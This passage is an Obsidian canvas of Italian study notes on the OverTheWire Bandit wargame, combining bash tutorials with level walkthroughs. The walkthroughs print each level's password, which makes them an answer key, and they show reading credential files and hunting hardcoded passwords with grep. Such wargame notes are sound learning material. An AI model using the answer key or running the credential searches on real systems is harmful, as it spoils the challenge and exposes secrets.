{
	"nodes":[
		{"id":"ea0a31adef225299","type":"text","text":"# Level 1, 2, 3, 4, 5\n\n1. Il file si chiama `-`, se provi a fare `cat -` ovviamente quello si aspetta che stai per scrivere un'opzione. Io ho risolto facendo `cp - /tmp/hello` (non avevo i permessi per scrivere altrove, `/tmp` è stato il best guess) e poi leggendo `cat /tmp/hello`.\n\n```\n263JGJPfgU6LtdEvgfWU1XP5yac29mFx\n```\n\n2. La difficoltà sarebbe che il file contiene spazi. A parte che se scrivi `cat s` e poi fai `tab` ti scrive già tutto in automatico, ma in caso te lo scordi puoi mettere l'escape character (`\\ `) oppure il nome tra virgolette (`cat 'spaces in this filename'`).\n\n```\nMNk8KNH3Usiio41PRUEoDFPqfxLPlSmx\n```\n\n3. I file nascosti si vedono con `ls -a`.\n\n```\n2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ\n```\n\n4. Come prima, visto che i file cominciano con `-` tocca trovare un altro modo, tipo `cat ./-file00`. Non mi andava di controllarli uno per uno: sotto parliamo di ***script bash***.\n\n```\n4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw\n```\n\n5. Qui il punto è: posso anche fare `for f in ./*; do ls -la ./$f; done | grep 1033`, e in effetti esce un unico file, il problema è che non mi dà il percorso (solo il nome!). Non so se ci sono modi per far stampare il percorso a `ls`, ma nel dubbio `du` lo fa già in modo nativo. Quindi `du -ab | grep 1033` (`-a` per stampare tutti i file e `-b` per le dimensioni in `byte`), restituisce `1033    ./maybehere07/.file2`, quindi `cat`. ***Oppure*** banalmente `find . -size 1033c`!! (non io che mi complico la vita).\n\n```\nHWasnPhtq9AVKe0dmk45nxy20cvUa6EG\n```","x":2820,"y":1027,"width":759,"height":859,"color":"4"},
		{"id":"d8bd274b8f96df69","type":"text","text":"# Bash - Enumerare e Leggere Cose\n\nAnzitutto bisogna capire ***cosa c'è*** nella directory, con ***`ls`***. `-l` mostra i dettagli dei vari file: `permessi #hard_link proprietario gruppo dimensione(byte) ultima_modifica nome`.\n\n - Posso ordinare i file per dimensione (`-lS`) o per ultima modifica (`-lt`)\n- Altre opzioni rilevanti sono `-a` (mostra anche i file nascosti), `-R` (mostra in modo ricorsivo il contenuto di tutte le sotto-directory), `-h` (`dimensione` viene tradotta in un formato più leggibile, e.g. `Kb`, `Gb`), `-d` (mostra solo le directory), `-i` (mostra gli ***inode*** dei file) e `-1` (mostra i file in una sola colonna, utile per creare liste);\n- Posso anche combinarlo con altri comandi per filtrare l'output:\n\t- ``ls -lhS | head -n 10`` mostra i 10 file più pesanti in formato leggibile;\n\t- `ls -l *.txt` mostra solo i file con estensione `.txt` (senza usare `grep`!).\n\nUna volta capito cosa c'è, la prossima domanda può essere ***cosa c'è dentro ai file***.\n\n- ***`file`*** - Restituisce la ***codifica del contenuto*** di un `file1` (e.g. `ASCII`, `EXIF`). Questo perché ci metto un attimo a salvare un'immagine come `immagine.txt` nonostante non sia affatto un `.txt` (... o un malware come `file.innocuo`);\n- ***`more`*** or ***`less`*** - Entrambi servono per ***mostrare il contenuto*** di un `file1`.\n\t- `more` è la versione più datata, stampa una riga per volta e ti fa andare solo avanti;\n\t- `less` è una sorta di reader integrato (come può essere `nano` per gli editor di testo), permette di andare su e giù e supporta la ricerca (`/parola` per l'occorrenza successiva, `?parola` per quella precedente).\n\t\t- ***`man`*** usa `less` come reader, e pertanto supporta la ricerca in questo modo.\n- ***`head`*** or ***`tail`*** - Non sempre voglio leggere davvero tutto il file. `head` mostra ***solo le prime `10` righe*** (`-n N` per mostrarne `N`), `tail` le ***ultime*** `10` (anche qui `-n N`);\n\t- `tail` può seguire in diretta l'evoluzione di un file con `-f` (e.g. `tail -f log.txt | grep \"error\"`, stampa in diretta solo gli errori).\n- ***`cat`*** - Nato originariamente con l'idea di concatenare più file in uno solo (`cat file1 file2 > file3` concatena i file `1` e `2` a formare il `file3`) viene di fatto utilizzato per ***stampare roba*** (`cat file1` mostra il contenuto di `file1` su `stdout`);\n\t- Le opzioni `-n` e `-b` su un singolo `file1` restituiscono rispettivamente il numero di righe di `file1` ed il numero di righe non vuote, `-s` stampa `file1` riducendo ogni `N` righe vuote consecutive ad una sola;\n\t- Ha una utile variante `tac` per ***stampare i file al contrario***!\n\t- Va facilmente in combo con i comandi di lettura di prima (e.g. `cat file1 | less`).\n","x":2820,"y":-166,"width":759,"height":957,"color":"4"},
		{"id":"7be47aaf1eeeeb0d","type":"text","text":"# Bash - Trovare Cose Velocemente: `locate`\n\nMentre `find` scorre ogni volta tutto l'albero del `filesystem`, `locate` costruisce e aggiorna periodicamente (ma ***non istantaneamente***!) un DB con le posizioni delle cose. \n\nSe cerco una roba che sta correttamente nel DB, `locate` è velocissima. Supporta le regex (se metto prima `-r`), come opzioni abbiamo `-i` (ignora `uppercase`), `-c` (mostra solo il numero di occorrenze trovate), `-b` (ricerca esatta, tipo `-w` di `grep`.\n\nPer aggiornare manualmente il DB, `sudo updatedb`.","x":3829,"y":1028,"width":759,"height":279,"color":"4"},
		{"id":"4e494b0e134ff4a7","type":"text","text":"# Bash - Trovare Cose nel `filesystem`: `find`\n\nForse il comando più potente di Linux. Per ***trovare `file` nel `filesystem`*** abbiamo\n\n```bash\nfind [path] [options] [criteria]\n```\n\n`[path]` è autoesplicativo: è il punto di partenza della ricerca. `[options]` e `[criteria]` vanno tipicamente insieme, perché posso cercare basandomi su\n\n- `-type` - il ***tipo*** di file. I più comuni sono `f` per i file \"standard\", `d` per le directory, `l` per i link simbolici, `c` per i file a caratteri (e.g. `/dev/tty`, terminale, o `/dev/random`,  generatore di numeri casuali), `b` per i file a blocchi (e.g. le partizioni come `/dev/sda` o `/dev/loop0`), `p` per i file `pipe` utili a far comunicare i processi tra loro ed `s` per i file di tipo `socket` (e.g. `Docker` si comporta come una specie di server interno al computer, ed ha un file `socket` a cui i processi devono mandare le richieste);\n\t- `-type` ricerca sostanzialmente sul tipo di ***inode***.\n- `-name` -  il ***nome*** del file. Come sintassi abbiamo `find /path -name \"criteri\"`;\n\t- Dentro i criteri posso usare le ***wildcard*** (o ***pathname expansions***) del `bash`:\n\t\t- `*` indica un numero qualsiasi di caratteri, `?` un singolo carattere, `{a, b}` esegue due comandi, uno per `a` e uno per `b` (e.g. `ls {giochi, libri}` legge sia la cartella `giochi` che la cartella `libri`);\n\t\t- `find / *_doc??.txt` cerca in tutto il `filesystem` tutti i file che iniziano con qualcosa (anche nulla!), poi hanno `_doc`, poi due caratteri qualsiasi e finiscono per `.txt`.\n\t- La variante `-iname` ignora la distinzione tra maiuscole e minuscole.\n- `-size` - la ***dimensione*** del file. Posso specificare una grandezza esatta o scrivere `+1G` (più grandi di `1 Gb`) e `-10M` (più piccoli di `1 MB`). Abbiamo `c` per i `byte` e `k` per i `kb`;\n- `-?time` - A seconda di `?` abbiamo una ricerca sui file `modificati` (`-mtime`, se ci riferiamo ai soli metadati abbiamo `-ctime`) e `letti` (`-atime`) negli ultimi  `tot` giorni;\n\t- `find /tmp -atime -1` restituisce i file letti nelle ultime 24 ore;\n\t- Varianti `-?min` per questa stessa cosa, ma con `tot` in minuti.\n- `-user`, `-group` - Specifica user e gruppo del file;\n- `-perm` - i ***permessi*** del file. Se cerco permessi specifici posso fare `-perm 400`, ma\n\t- Se mi interessano dei permessi minimi uso `-perm -400` (i.e. `trova tutti i file che possono essere letti dall'owner`) o in modo analogo `-perm -o=r`). In generale abbiamo `owner` (`u`), `group` (`g`), `others` (`o`) o `all` (`a`).","x":3829,"y":-165,"width":759,"height":957,"color":"6"},
		{"id":"625ede0e186681f5","type":"text","text":"# Level 6, 7, 8, 9\n\n6. Questa è una ricerca in tutto il filesystem partendo dalla radice e con criteri di dimensione e permessi. In questo caso è sufficiente `find / -type f -user bandit7 -group bandit6 2>/dev/null`.\n```\nmorbNTDkSW6jIlUc0ymOdMaLnOlFVAaj\n```\n\n7. Questa ricerca è ancora più facile, `cat data.txt | grep \"millionth` o `less data.txt` e poi `/millionth`.\n```\ndfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc\n```\n\n8. Ok. Qua bisogna controllare il numero di occorrenze di un botto di roba. `grep -c` fa esattamente questo. Enumeriamo le righe con un `cat` in un ciclo `for` e stampiamo la riga che compare esattamente una volta:\n```bash\nfor line in $(cat data.txt); do if [[ $(grep -c \"$line\" data.txt) = 1 ]]; then echo $line; fi; done\n```\n- Questo ovviamente l'ho scritto prima di conoscere il comando `uniq`, che elimina le righe duplicate, ma ***adiacenti***. Fare `uniq -u data.txt` è quindi inutile, ma anche `sort -u` per qualche motivo non funziona. L'unico modo che ho trovato per farlo funzionare è `sort data.txt | strings | uniq -u`, una volta appurato che `sort` da solo funziona e che `strings` a quanto pare rende il tutto comprensibile per `uniq`. Vabbè, la chiave è\n\n```\n4CKMh1JI91bUIZZPXDqGanal4xvAg0JM\n```\n\n9. Facile, `strings data.txt | grep \"===\"`.\n\n```\nFGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey\n```","x":4838,"y":1028,"width":759,"height":858,"color":"4"},
		{"id":"19241c3faaf980ec","type":"text","text":"# Level 10, 11, 12\n\n10. Per decodificare `base64` abbiamo il comando... `base64 -d`.\n```\ndtR173fZKb0RRsDFSGsg2RWnpNVj3qRr\n```\n\n11. Implementiamo il cifrario di Cesare con chiave 13 (anche detto `rot13`, che per qualche strano motivo non ha una funzione che lo implementa direttamente, tocca usare `tr`).\n\n```\n7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4\n```\n\n12. Creiamo una cartella temporanea con `mktemp /tmp/mydir.XXX`. Non posso leggere `/tmp`, ma posso attraversarla. Copio `data.txt` in `mydir.ABC` e lo leggo. La prima riga dell'`hexdump` mi dice che è stato compresso con `gzip` (magic number `1f 8b`), quindi `xxd -r data.txt > unhex.txt.gz` (gli devi mettere l'estensione giusta, altrimenti si lamenta) per ricostruire il file compresso originale e `gunzip unhex.txt.gz` per estrarre `unhex.txt`. Costui è di nuovo un file binario, e non abbiamo idea della codifica in cui è scritto, quindi di nuovo `hexdump` (o `xxd`). Sorpresa! `42 5a` (che tra l'altro codificano `BZ` in `ASCII`), quindi rifacciamo lo stesso giochino con `bzip2`. Pensavo di aver finito, ma no! `1f 8b` è di nuovo il magic number di `gzip`. Ripetiamo.\n- Questo era il primo tentativo. Al secondo non mi faceva leggere la cartella `mydir.XXX`, boh. Ho trovato una cartella in cui potevo sia leggere che scrivere (`/run/lock`), ci ho abusivamente fatto una cartella e ho ricominciato il giochino di prima, stavolta usando `file` per controllare il formato dei risultati (invece dei magic numbers...). Così facendo scopriamo che il punto dove pensavo di aver finito al primo tentativo era in realtà metà del lavoro, perché quello era un file `.tar`! E poi `.gz`, e poi di nuovo `.tar`... Insomma, tutta così fino a `gunzip -c data8.bin.gz`, che contiene la `password`.\n\t- Nota per quando leggi l'`hexdump`: il primo archivio non aveva magic number noto, ma si potevano vedere i nomi dei file in esso contenuti, nella colonna `ASCII`!\n\n```\nFO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn\n```","x":5847,"y":1029,"width":759,"height":857,"color":"4"},
		{"id":"df5e2abc8ea4b780","type":"text","text":"# Esempi di `grep`\n\n```bash\n# Stampa hello, hello123, hellothere\necho \"hello world, hello123, hellothere\" | grep -Eo 'hello\\w*'\n\n# Mostra solo i processi relativi a Firefox\nps aux | grep firefox\n\n# Estrae i soli numeri da un testo\necho \"ID: 123, User: 456, Code: 789\" | grep -Eo '[0-9]+'\n\n# Estrae i soli indirizzi IP da un file di log\ngrep -Eo \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" access.log\n\n# Estrae i soli indirizzi email da un file\ngrep -Eo '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' file.txt\n\n# Trova password hardcoded\ngrep -r \"password\" /var/www/html/\n```","x":5847,"y":-165,"width":759,"height":957,"color":"3"},
		{"id":"3565595bf897b446","type":"text","text":"# Trasferire `files` in/da Remoto\n\nCi sono diverse alternative per copiare roba dal server remoto alla macchina da cui parte la connessione. Assumendo di conoscere il percorso dei file che mi interessano, posso\n\n- Loggare `ssh`, `cat` sui file che mi interessano e fare copia manuale. Se (come per il `livello 13`) devo copiare roba delicata come una chiave `RSA`, non è ottimale: potrei perdere informazioni di formattazione; \n- Usare il `Secure Copy Protocol` con sintassi `scp user@server:/file/on/server /target/on/my/pc` (per copiare qualcosa dal tuo pc al server inverti `source` e `target`). Ha opzioni per trasferire intere cartelle (`-r`) e per per farlo con compressione (`-C`);\n\t- ***Conviene usarlo se devo trasferire un solo file di cui conosco il path***.\n- Usare `Remote Sync`, sintassi `rsync user@server:/file/on/server /target/on/my/pc` (idem per l'inversione);\n\t- Un'***opzione*** molto interessante è ***`-a`***, che ***mantiene permessi***, timestamp e symlink. Mi conviene metterla perché `ssh` è schizzinoso, e accetta solo chiavi private con permessi `600` (i.e. solo il proprietario può fare `r/w`);\n\t- `-u` evita di sovrascrivere file con timestamp più recente;\n\t- `-v` (`verbose`) dà più info sul trasferimento;\n\t- `-z` comprime i file prima di inviarli;\n\t- Se usi il server come backup ed elimini un file in locale, al prossimo `rsync` vorresti che venga eliminato anche in remoto. Per questo esiste l'opzione `--delete`;\n\t- Se avevi iniziato un grosso trasferimento ma poi è saltata la luce, puoi ripetere il comando dicendogli di recuperare i dati che aveva già scaricato con `--partial`;\n\t- ***Conviene usarlo se ho tanta roba da trasferire***;\n- Usare `Secure File Transfer Protocol`. `sftp user@server` apre una connessione `SFTP` che si traduce in una shell interattiva che collega due `directory`: quella del `server`, nel quale navigo normalmente con i comandi della shell, e quella dell'`host`, nel quale navigo con gli stessi comandi con una `l` davanti (e.g. `lcd`, `lls`, ...);\n\t- Ho i comandi tipici di `FTP`: `get file_on_server.txt`, `put file_on_host.txt`;\n\t- Aggiungo `-r` per scaricare intere cartelle;\n\t- Uso `mget [files]` ed `mput [files]` per gestire file multipli;\n\t- Chiudo la connessione con `exit` o con `bye`;\n\t- ***Conviene usarlo se mi interessa navigare nel `server` per cercare cosa trasferire***.\n- Usare `netcat` (`nc`). Vedi il rettangolo più a destra.","x":6857,"y":-165,"width":759,"height":957,"color":"4"},
		{"id":"22b8634d71376455","type":"text","text":"# Level 13, 14, 15\n\n13. Per usare `scp` sulla porta `2220`, `scp -P 2220 [resto del comando]`, mentre per `rsync` bisogna proprio dirgli di usare `ssh` con `rsync [options] -e \"ssh -p 2220\"`. Usiamo il primo. Non c'è `password`, ma ora abbiamo una `private key` in `~/.ssh`.\n14. Anzitutto, `chmod 600 ~/.ssh/sshkey.private` per settare i permessi della chiave privata (che altrimenti `ssh` piange). Quindi procediamo a specificare di usarla, con `ssh -p 2220 -i ~/.ssh/sshkey.private bandit14@bandit.labs.overthewire.org`. La password è in `/etc/bandit_pass/bandit14`, e va mandata a `localhost` sulla porta `30000`. Lo facciamo con `nc -v localhost 30000`, che ci restituisce la `password`.\n\n```\n8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo\n```\n\n15. Qui apriamo una connessione con `openssl` invece che con `nc`. Il comando completo  è `openssl s_client localhost:30001` e poi mandiamo la `password` precedente.\n\n```\nkSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx\n```\n\n16. Grazie ad uno `script` di `nmap` possiamo cercare direttamente le porte che parlano `SSL/TLS`: basta fare `nmap -p 1000-2000 --script ssl-cert localhost`. Ne risultano due server, andando a tentativi troviamo NO, DICE DI FARE KEYUPDATE MA POI SE RINEGOZIO CHIUDE LA CONNESSIONE.\n```\n\n```","x":7866,"y":1029,"width":759,"height":857,"color":"1"},
		{"id":"d6df1ebc088bc55b","type":"text","text":"# Crittografia\n\nIl cifrario di ***Cesare*** si può implementare con il comando `tr`:\n\n```bash\n cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'\n```\n\nQuesto in particolare è ***rot13***, perché fa comodo (critta e decritta nello stesso verso).\n\nUna codifica molto comune è `base64` (`-d` per decrittare).\n\n\n\n","x":6857,"y":2118,"width":759,"height":951},
		{"id":"28c7fa5a4a2add1f","type":"text","text":"# Hexdump\n\nI programmi aprono i `file` basandosi sull'estensione, scelgono cosa mostrare o non sono in grado di rappresentare correttamente tutte le informazioni in esso contenute. Questo significa che il vero controllo è sui singoli `byte`. Ma come li leggo?\n\nAnzitutto converto l'intero `file` in binario (o meglio, in esadecimale, che altrimenti è una roba illeggibile). Questa roba si fa con `hexdump`, preferibilmente con opzione `-C`, che stampa un formato più user-friendly di tipo\n\n```\n# OFFSET                # VALORI BYTES                           # ASCII\n0001ff00  50 4b 05 06 00 00 00 00  01 00 01 00 5a 00 00 00  |PK..........Z...|\n```\n\n`OFFSET` indica il primo `byte` che compare in `VALORI BYTES`. Il `byte 1ff00` assume valore esadecimale `50` (`80` in decimale), che in `ASCII` indicizza il carattere `P`. In questo caso, `50 4b` (i.e. `PK`) è il ***magic number*** di un file `.zip`, mentre `05 06` identifica la fine di un file `.zip` (`End of Central Directory Record`).\n\nQuesto per dire che i dati nascosti includono il reale formato del file, indipendentemente dall'estensione che risulta nel `filesystem`. Esempi di magic numbers sono `89 50 4E 47` (`PNG`), `FF D8 FF` (`JPEG`) e `7F 45 4C 46` (`ELF`, i.e. eseguibile Linux), e si trovano all'inizio della prima riga dell'`hexdump`.\n\nAltra cosa comune è individuare la presenza di ***metadati***. Un file `mp3` può ad esempio contenere, oltre alla musica, informazioni quali `titolo`, `artista` e via dicendo. Questi dati vengono spesso ignorati da un `media player`, ma stanno là!\n\n```\n0001fa20  49 44 33 04 00 00 00 00  00 21 54 49 54 32 00 00  |ID3......TIT2..|\n```\n\nIn questo esempio `ID3` rappresenta il formato dei metadati su `mp3`. Questa riga del file di `hexdump` indica che a partire dal `byte 1fa20` troveremo i metadati sulla traccia audio.\n\nAltri esempi di metadati sono i formati `EXIF` (per `JPEG`) e `XMP` (su `PDF Adobe`).\n\nInfine, ovviamente, tutto questo si può usare per nascondere messaggi nei `file`.","x":4838,"y":2118,"width":759,"height":951,"color":"4"},
		{"id":"09449e1e2bf4e019","type":"text","text":"# Interpretare un `hexdump`\n\nTutto molto bello, ma posso fare così solo se sono io ad eseguire `hexdump -C`. Come faccio se trovo un file `hexdump` senza interfaccia user-friendly `-C`?\n\nPosso tornare al file originale con il comando `xxd`. Di per sé fa la stessa cosa di `hexdump`, ma a differenza di quest'ultimo ha una simpatica opzione `-r` per ***tornare indietro***.\n\n```bash\nxxd [opzioni] [file] [output]\n```\n\n- `-p` se hai un input di soli esadecimali (senza impaginazione user-friendly);\n- `-g [N]` ti permette di vedere `N byte` alla volta direttamente tradotti in `ASCII`.","x":4838,"y":3314,"width":759,"height":345,"color":"4"},
		{"id":"fde5e59d70e6ddbe","type":"text","text":"# Compressione e Archiviazione\n\nL'idea alla base della compressione è la seguente: i dati sono spesso ridondanti, posso trovare una ***rappresentazione più compatta*** perdendo poca o nessuna informazione.\n\nIdealmente vorremmo una compressione ***lossless*** (senza perdita di informazione) per cose come codici e file di sistema. Come si ottiene?\n\n- ***Run-Length Encoding*** (***RLE***) - `AAAAAAAAAA` $\\to$ `10A`;\n- ***Dizionari*** - `ABCDABCDABCD` $\\to$ `ABCD[1,4]`;\n- ***Huffman Coding*** - `1010101011111000` $\\to$ `10 = A`, `11 = B`, `00 = C`$\\to$ `AAAABBAC`.\n\nPosso invece applicare compressioni ***lossy*** a file meno importanti (e.g. `jpeg` elimina alcuni dettagli poco visibili). Abbiamo diversi comandi/algoritmi built-in nella shell:\n\n- `gzip` - Compressione rapida, ma non ottimale. `gunzip` torna indietro, se specifico `-k` quando comprimo mantiene anche il file originale. Estensione `.gz`;\n- `bzip2` - Più lento, ma più ottimizzato. `bunzip2` torna indietro. Estensione `.bz2`;\n- `xz` - Lentissimo ma efficientissimo. `unxz` torna indietro. Estensione `.xz`.\n\nPer scegliere il file di destinazione tocca usare l'opzione `-c` (sceglie `stdout` come output) e poi reindirizzare sul file che voglio con un `>` finale.\n\n\"Ma perché vedo spesso la doppia estensione `.tar.gz`?\"\n\nQuesto accade quando si comprime (`.gz`) un ***archivio*** (`.tar`). E che roba è? Se devo mandare file multipli, non posso semplicemente inviare una `directory` (banalmente, lei è solo un'organizzazione logica dei puntatori agli `inodes` del `filesystem` locale). Allora creo un file `archivio` in cui metto tutti i file che voglio mandare. In pratica, è come fosse una `directory`, ma è un `file`. Chiaro, no?\n\nLinux usa tendenzialmente il comando `tar` (`Tape ARchive`) per gestire gli `archivi`.\n\n```bash\ntar [opzioni]\n```\n\n- `-c [input_files]`, `-x` - Rispettivamente, crea ed estrae un archivio. Devo sempre specificarne il nome, con `-f [target]`. Si usano quindi in genere insieme: `tar -cf [target] [input_files]` e `tar -xf [target]`;\n- Può integrare una compressione, usando `gzip` (`-z`), `bzip2` (`-j`) o `xz` (`-J`).","x":5847,"y":2118,"width":759,"height":951,"color":"4"},
		{"id":"04825a06a9d94d59","type":"text","text":"# Bash - Controllo di Flusso\n\n```bash\nfor f in ./*; do echo \"file $f: \"; cat \"$f\"; echo; echo; done\n```\n\nQuesta è la ***concatenazione*** di comandi bash con cui si può risolvere il livello 4. In generale:\n\n- `comando &` esegue il `comando` in ***background***;\n- `c1; c2` esegue prima `c1` e poi `c2`, ***indipendentemente dall'esito*** del primo;\n- `c1 && c2` esegue `c2` solo se `c1` ha ***successo*** (i.e. `exit status 0`);\n- `c1 || c2` esegue `c2` solo se `c1` ***fallisce*** (e.g.  `mkdir prova || echo \"errore\"`).\n\nQualsiasi comando ha due tipologie di output: ***`stdout`*** per i risultati ordinari e ***`stderr`*** per gli errori. Se non viene specificato diversamente, entrambi vengono stampati su terminale. Altrimenti, entriamo nel mondo degli ***operatori di reindirizzamento***:\n\n- `comando > file` sovrascrive `file` con lo `stdout` di `comando`, mentre `comando >> file` lo aggiunge in coda (`append`);\n- `comando 2> file` e `comando 2>> file` discorso analogo, ma con `stderr`;\n\t- Posso anche dare entrambi i comandi insieme, e.g. `comando > file 2> errors` reindirizza `stdout` in `file` e `stderr` in `errors`;\n\t- Molto comune è la scrittura `2> /dev/null`, che reindirizza gli errori in un file che fa le veci di un buco nero in cui tutto viene distrutto (per un output più pulito). \n- `comando &> file` reindirizza entrambi, e anche lui ha il suo analogo in versione `append` con `comando &>> file.log`. Questa sarebbe la forma abbreviata di `comando > output 2>&1`, cioè `metti stdout in output, e stderr dove hai messo stdout`;\n\t- È l'unico caso in bash in cui `&` viene usato come \"puntatore\" (allo stream `1`).\n- `comando < file` usa `file` come input per `comando`;\n- `c1 | c2` esegue `c1`, quindi passa il suo output come input di `c2`.\n\t- I comandi \"telefonati\" da usare con `|` sono `grep` e `tee` (`comando | tee file` mostra l'output di `comando` a schermo e lo salva anche su `file`).\n","x":2820,"y":2117,"width":759,"height":797,"color":"4"},
		{"id":"efbeb23d6fccc658","type":"text","text":"# Script Bash\n\nOgni ***script bash*** inizia con `#!/bin/bash`. Perché? Bash è un ***linguaggio interpretato***, e questo simpatico operatore `#!` (detto ***shebang***, da `sharp (#) + bang (!)` se te lo stessi chiedendo) serve a specificare il percorso dell'interprete da usare. Per capirci, se scrivi `#!/usr/bin/python3` e poi esegui `./script.py`, questo verrà interpretato in automatico da `python3`, senza bisogno di scrivere sulla shell `python3 script.py`. \"Quindi posso non mettere `#!/bin/bash` e scrivere direttamente sulla shell `bash script.sh`?\". Sì, ma basta con le digressioni, andiamo avanti.\n\nTutti questi operatori ci portano con molta naturalezza a voler mettere un botto di comandi in fila utilizzando i costrutti fondamentali di un qualsiasi linguaggio di programmazione.\n\nTutti i costrutti che seguono possono essere scritti come singola riga. In quel caso, gli \"a capo\" si sostituiscono con l'operatore `;`. Partiamo con l'`if` e vediamo un esempio:\n\n```bash\nif [[ condizione ]]; then\n\tcomando1\n\tcomando2\nelif [[ altra condizione ]]; then\n\tcomando3\nelse\n\tcomando4\nfi\n```\n\nChe su una sola riga diventa\n\n```bash\nif [[ condizione ]]; then comando1; comando2; elif [[ altra condizione ]]; then comando3; comando4; else comando4; fi\n```\n\nPuò essere utile `case`, quando mettere troppi `elif` diventa noioso:\n\n```bash\ncase variabile in\n\tpattern1) comando1 ;;\n\tpattern2) comando2 ;;\n\t...\n\t*) comando_default ;;\nesac\n```\n\nSeguono i `loop`: `for`, `while` e poi boh, a qualcuno evidentemente non andava di scrivere `while [[ ! condizione]]` (che continua a girare finché `! condizione` non diventa `True`) e si è inventato `until [[ condizione ]]` (gira finché `condizione` non diventa `False`).\n\n```bash\nfor var in elenco; do\n\tcomando1\n\tcomando2\ndone\n```\n\n```bash\nwhile [[ condizione ]]; do\n    comando1\n    comando2\ndone\n```\n\n```bash\nuntil [[ condizione ]]; do\n    comando1\n    comando2\ndone\n```\n\nIn basso segue come definire le funzioni.","x":3829,"y":2118,"width":759,"height":1541,"color":"4"},
		{"id":"3d73dc291ec51cb6","type":"text","text":"# Bash - Espansioni, Espressioni, Logica\n\nPer avere il quadro completo manca il ruolo del meraviglioso operatore `$`.\n\n- ***`$f`*** (***espansione di variabile***) - Se `f` è una variabile, `$f` sostituisce il suo contenuto;\n- ***`$(comando)`*** (***espansione di comando***) - Ogni `comando` restituisce un certo output. Questa scrittura esegue `comando` e ne utilizza l'output in una espressione;\n- ***`$((algebra))`*** (***espressione algebrica***) - Questa scrittura esegue operazioni di `algebra` elementare. Non si possono innestare comandi (e.g. `du`) al suo interno!\n\nA questo dobbiamo aggiungere l'operatore di ***test logico*** per condizioni booleane. La scrittura è `[[ condizione ]]`, e restituisce il valore `True` o `False` della `condizione`.\n\n- ***Test su `file`*** - La scrittura `-X file` restituisce `True` se, per diversi `-X`, `file`\n\t- esiste (`-e`), è un file (`-f`), è una directory (`-d`), è non-vuoto (`-s`);\n\t- è leggibile (`-r`), scrivibile (`-w`) o eseguibile (`-x`);\n- ***Confronto tra `file`*** - La scrittura `file1 -nt file2` restituisce `True` se `file1` è più nuovo (i.e. ha data di modifica più recente) di `file2` (e viceversa con `-ot`);\n- ***Test su `stringa`*** - `-z str` restituisce `True` se `str` è vuota (non-vuota con `-n`);\n- ***Confronto tra `stringhe`*** - Classici operatori di `=`, `!=`, `>` e `<` (questi ultimi due a livello lessicografico). Molto è interessante è verificare se una `stringa` è il prodotto di una ***regex*** con la condizione `str =~ regex`;\n- ***Confronto tra numeri*** - Classici operatori `-eq`, `-ne`, `-lt` `-le`, `-gt`, `-ge`.\n\nPuoi combinare più `condizioni` secondo gli operatori `&& (AND)`, `|| (OR)` e `! (NOT)`.","x":2820,"y":3013,"width":759,"height":646,"color":"4"},
		{"id":"592cc115c760d58b","type":"text","text":"# Script Bash - Funzioni\n\nCi sono due modi equivalenti di dichiarare le funzioni:\n\n```bash\nfunction nome_funzione {\n    comando1\n    comando2\n}\n```\ne\n```bash\nnome_funzione() {\n    comando1\n    comando2\n}\n```\n\nIn ogni caso, i ***parametri*** non vanno passati tra parentesi.\n\n```bash\nsomma() {\n\techo $(( $1 + $2 ))\n}\n\nsomma 4 5    # Output: 9\n```\n\nIntuitivamente, `$N` è l'`N`-esimo parametro passato, dove `N` può essere qualsiasi (il numero di parametri letti dalla funzione è accessibile con `$#`). Posso poi prendere tutti i parametri insieme e trattarli come ***lista*** (`$@`) o come ***stringa*** (`$*`).\n\n`return` qui rappresenta il codice di uscita, ed è pertanto recuperabile con `$?` (restituisce il codice di uscita dell'ultimo comando eseguito) subito dopo la sua esecuzione.\n\nTutte le variabili dentro le funzioni sono intese come globali, salvo specifica `local`.\n\nUn'applicazione interessante è fare override di comandi noti, e.g.\n\n```bash\nls() {command ls --color=auto \"$@\"}\n\nls   # Usa ls con colori sempre attivi\n```","x":3829,"y":3894,"width":759,"height":935,"color":"4"},
		{"id":"b008c9c94e60d49d","type":"text","text":"# Bash - Opzioni Avanzate per `find`\n\nPosso combinare diverse `options` con i classici operatori logici.\n\n- `AND` - è sottinteso (se proprio vuoi sarebbe `-a`, ma basta mettere più opzioni in fila;\n- `OR` - è `-o`, ma devi stare attento alle parentesi (che vanno messe con l'escape `\\`), e.g. `find /home -type f \\( -name \"*.mp3\" -o -name \"*.flac\" \\)`;\n- `NOT` - basta il `!`, seguito da spazio (non attaccarlo alla cosa da negare!).\n\nPosso limitare la profondità della ricerca (`-maxdepth`) o ignorare i primi livelli (`-mindepth`).\n\nMa `find` è più potente di una semplice ricerca, perché permette contestualmente di ***eseguire comandi sui file trovati***.\n\n- `-print` - Stampa il percorso completo dei file trovati;\n- `-delete` - Elimina direttamente tutto ciò che trova (***pericoloso!***);\n- `-exec` - Permette di eseguire ***qualsiasi comando `bash`*** sui file trovati.\n\t- `find / -name \"*.log\" -exec du -h {} \\;` - mostra la dimensione dei file trovati;\n\t\t- `{}` è un ***placeholder*** per la lista dei file che trova (quindi deve comparire in ogni comando che segue `-exec`);\n\t\t- `\\;` indica la fine del comando da eseguire per ogni file trovato. Bisogna mettere l'escape `\\` per evitare che la shell lo interpreti come concatenazione.\n\t- `find /home -name \"*.jpg\" -exec mv {} /backup/foto/ +` - Sposta tutti i file `.jpg` in una cartella di backup;\n\t\t- `+` serve ad eseguire la `mv` in parallelo, piuttosto che in serie.\n\t- Lasciamo ulteriori esempi in un quadratone a parte.\n\nAltri utilizzi furbi includono la ricerca di hard link duplicati e directory vuote:\n\n```bash\nfind / -samefile /path/to/file\nfind /home -type d -empty\n```","x":4838,"y":-1249,"width":759,"height":848,"color":"4"},
